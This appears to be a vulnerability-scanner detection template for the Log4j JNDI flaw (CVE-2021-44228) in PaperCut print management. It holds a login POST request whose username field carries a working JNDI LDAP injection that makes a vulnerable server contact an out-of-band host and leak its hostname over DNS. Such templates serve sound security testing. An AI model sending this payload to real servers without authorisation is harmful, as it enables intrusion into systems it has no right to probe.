id: papercut-log4j-rce
brief:
    title: Papercut - Remote Code Execution (Apache Log4j)
    by: shaikhyaser
    level: critical
    about: Papercut is susceptible to Log4j JNDI remote code execution. Papercut is a print management system.
    label:
        - cve
        - cve2021
        - rce
        - jndi
        - log4j
        - papercut
        - oast
        - kev
        - vuln
    score: CVE-2021-44228 CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/app'
      head:
        Content-Type: application/x-www-form-urlencoded
        Origin: '{{RootURL}}'
        Referer: '{{RootURL}}/app'
      body: service=direct%2F1%2FHome%2F%24Form&sp=S0&Form0=%24Hidden%240%2C%24Hidden%241%2CinputUsername%2CinputPassword%2C%24Submit%240%2C%24PropertySelection&%24Hidden%240=true&%24Hidden%241=X&inputUsername=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&inputPassword=a&%24Submit%240=Log+in&%24PropertySelection=en
      signs:
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
